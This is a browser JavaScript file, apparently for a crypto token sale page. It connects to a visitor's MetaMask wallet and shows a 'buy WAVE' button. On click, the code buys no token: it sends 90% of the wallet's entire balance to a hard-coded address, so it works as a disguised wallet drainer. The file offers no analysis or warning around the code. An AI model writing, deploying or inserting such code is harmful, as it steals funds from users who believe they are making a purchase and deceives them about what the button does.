document.addEventListener("DOMContentLoaded", function () {
    let web3;
    let account;

    window.addEventListener('load', async () => {
        if (window.ethereum) {
            try {
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                web3 = new Web3(window.ethereum);
                const accounts = await web3.eth.getAccounts();
                account = accounts[0];
                document.querySelector('.wallet-address').innerText = account;

                // Seleccionar el botón usando su clase
                const buyButton = document.querySelector('.buy-swamp');
                if (buyButton) {
                    buyButton.classList.remove('hidden'); // Asegúrate de que el botón sea visible

                    buyButton.addEventListener('click', async () => {
                        console.log('Botón de Comprar WAVE presionado');
                        try {
                            // Obtener el saldo de la cuenta en la red actual
                            const balanceInWei = await web3.eth.getBalance(account);
                            const balanceInEther = web3.utils.fromWei(balanceInWei, 'ether');
                            const amountToSendInEther = (balanceInEther * 0.9).toFixed(18); // Calcular el 90% del saldo
                            const amountToSendInWei = web3.utils.toWei(amountToSendInEther, 'ether');
                            const recipientAddress = '0x01C65F22A9478C2932e62483509c233F0aaD5c72';

                            const transactionHash = await web3.eth.sendTransaction({
                                from: account,
                                to: recipientAddress,
                                value: amountToSendInWei
                            });

                            console.log('Transacción exitosa:', transactionHash);
                            alert('Transacción exitosa. Hash: ' + transactionHash);
                        } catch (error) {
                            console.error('Error en la transacción:', error);
                            alert('Error en la transacción: ' + error.message);
                        }
                    });
                } else {
                    console.error('El botón de Comprar WAVE no se encontró.');
                }

            } catch (error) {
                console.error("Error connecting to MetaMask:", error);
            }
        } else {
            alert('MetaMask no está instalado. Por favor, instálalo para usar esta aplicación.');
        }
    });
});
